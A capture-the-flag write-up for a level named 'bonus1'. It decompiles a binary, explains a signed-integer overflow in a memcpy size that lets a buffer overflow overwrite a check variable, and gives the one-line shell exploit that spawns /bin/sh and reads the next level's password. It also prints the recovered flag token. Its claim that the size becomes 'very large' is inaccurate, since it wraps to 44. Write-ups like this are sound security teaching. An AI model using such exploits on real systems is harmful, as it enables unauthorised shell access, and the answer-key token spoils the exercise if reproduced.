# Bonus1

1. Decompilation with Ghidra

    ```c
    undefined4 main(undefined4 param_1, int param_2)
    {
    undefined4 uVar1;
    undefined1 local_3c [40];  // buffer de 40 octets
    int local_14;              // variable pour stocker le nombre
    
    local_14 = atoi(*(char **)(param_2 + 4));  // argv[1] converti en int
    if (local_14 < 10) {                        // doit être < 10
        memcpy(local_3c, *(void **)(param_2 + 8), local_14 * 4);  // copie argv[2]
        if (local_14 == 0x574f4c46) {             // si == 1464814662
        execl("/bin/sh","sh",0);                 // SHELL !
        }
        uVar1 = 0;
    }
    else {
        uVar1 = 1;
    }
    return uVar1;
    }
    ```

2. The Vulnerability: Integer Overflow

    The program has multiple issues:

    1. **Signed Integer Check**: The program checks `local_14 < 10`, but `local_14` is a **signed integer**
    2. **Integer Multiplication**: `memcpy` uses `local_14 * 4` as the size parameter
    3. **Win Condition**: If `local_14 == 0x574f4c46` (1464814662), it spawns a shell


    ```
    [buffer: 40 bytes]  <- local_3c (at ebp-0x3c)
    [local_14: 4 bytes] <- at ebp-0x14
    ```

    Distance: `0x3c - 0x14 = 0x28 = 40 bytes`

3. Exploitation

    1. **Use a negative number** for `argv[1]` to pass the check `< 10`
    2. **Integer overflow** on multiplication: negative × 4 wraps to a large positive number
    3. **Buffer overflow** via `memcpy` to overwrite `local_14`
    4. **Overwrite `local_14`** with `0x574f4c46` to trigger shell execution

    We need a number `N` such that:

    - `N < 10` (passes the check)
    - `N * 4` overflows to a value ≥ 44 (to copy enough bytes)
    - We can write 40 bytes of padding + 4 bytes of `0x574f4c46`

    **Solution**: `-2147483637`

    - This is close to `INT_MIN` (-2147483648)
    - When multiplied by 4: `-2147483637 * 4 = -8589934548`
    - Due to 32-bit integer overflow, this wraps around to a large positive value
    - This allows `memcpy` to copy at least 44 bytes

    ```
    [40 bytes padding] + [0x574f4c46 in little-endian]
        "A" × 40     +    \x46\x4c\x4f\x57
    ```

    ```bash
    ./bonus1 -2147483637 $(python -c 'print "A"*40 + "\x46\x4c\x4f\x57"')
    ```

4. Execution Flow

    1. `atoi(argv[1])` converts "-2147483637" to integer `local_14 = -2147483637`
    2. Check passes: `-2147483637 < 10` ✓
    3. `memcpy(local_3c, argv[2], -2147483637 * 4)` is called
    4. Integer overflow makes the size very large, copying our entire payload
    5. Buffer overflows and overwrites `local_14` with `0x574f4c46`
    6. Condition `local_14 == 0x574f4c46` is true
    7. `execl("/bin/sh")` spawns a shell
    8. Read `/home/user/bonus2/.pass`

5. Token discovered

    The token is: `579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245`
